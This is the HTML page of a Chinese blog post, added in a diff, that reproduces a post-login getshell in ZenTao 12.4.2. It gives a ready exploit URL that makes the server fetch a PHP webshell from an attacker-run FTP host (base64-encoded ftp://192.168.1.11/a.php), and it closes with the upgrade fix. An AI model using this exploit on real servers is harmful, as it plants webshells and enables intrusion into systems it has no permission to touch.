@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="内网渗透实战篇">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    禅道12.4.2后台管理员权限Getshell复现 |
+    
+    北城荒</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/technology.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-禅道12-4-2后台管理员权限Getshell复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      禅道12.4.2后台管理员权限Getshell复现
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/11/12/%E7%A6%85%E9%81%9312-4-2%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90Getshell%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2020-11-12T07:11:06.000Z" itemprop="datePublished">2020-11-12</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <p>1、简介</p>
+<pre><code>    禅道是第一款国产的开源项目管理软件，她的核心管理思想基于敏捷方法scrum，内置了产品管理和项目管理，同时又根据国内研发现状补充了测试管理、计划管理、发布管理、文档管理、事务管理等功能，在一个软件中就可以将软件研发中的需求、任务、bug、用例、计划、发布等要素有序的跟踪管理起来，完整地覆盖了项目管理的核心流程。</code></pre>
+<p>2、漏洞描述</p>
+<pre><code>    禅道12.4.2版本存在任意文件下载漏洞，该漏洞是因为client类中download方法中过滤不严谨可以使用ftp达成下载文件的目的。且下载文件存储目录可解析php文件，造成getshell。</code></pre>
+<p>3、影响版本</p>
+<pre><code>    禅道 ≤ 12.4.2</code></pre>
+<p>4、环境搭建</p>
+<pre><code>    环境：phpStudy+禅道12.4.2
+    1)、官网下载禅道12.4.2
+     因为我们要调试代码，所以下载源码，不用官方的集成环境，这里我用的是中文版的那个源码。
+    https://www.zentao.net/dynamic/zentaopms12.4.2-80263.html
+
+    2)、源码安装</code></pre>
+<p><img src="/images/pasted-8.png" alt="upload successful"></p>
+<p><img src="/images/pasted-9.png" alt="upload successful"></p>
+<p><img src="/images/pasted-10.png" alt="upload successful"></p>
+<p>5、漏洞复现</p>
+<pre><code>   需先登录
+   EXP:http://127.0.0.1/zentao/client-download-1-ZnRwOi8vMTkyLjE2OC4xLjExL2EucGhw-1.html
+   http://127.0.0.1/zentao/data/client/1/&lt;download link filename&gt;
+   其中ZnRwOi8vMTkyLjE2OC4xLjExL2EucGhw为ftp://192.168.1.11/a.php的base编码</code></pre>
+<p><img src="/images/pasted-11.png" alt="upload successful"></p>
+<pre><code>    然后本地就存在这个文件</code></pre>
+<p><img src="/images/pasted-12.png" alt="upload successful"></p>
+<p><img src="/images/pasted-13.png" alt="upload successful"></p>
+<pre><code>     注意：ftp://192.168.1.11/a.php 意思是要你自己开一个ftp服务，并放入a.php马，这样就可以连接到ftp服务并将马放入系统</code></pre>
+<p>6、修复方式</p>
+<pre><code>    升级到禅道12.4.3及之后的版本</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/12/%E7%A6%85%E9%81%9312-4-2%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90Getshell%E5%A4%8D%E7%8E%B0/" data-id="ckhfl89870002p8ut7v2t7hew"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/11/12/hello-world/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Hello World
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/11/11/BIG-IP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">BIG-IP代码执行</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
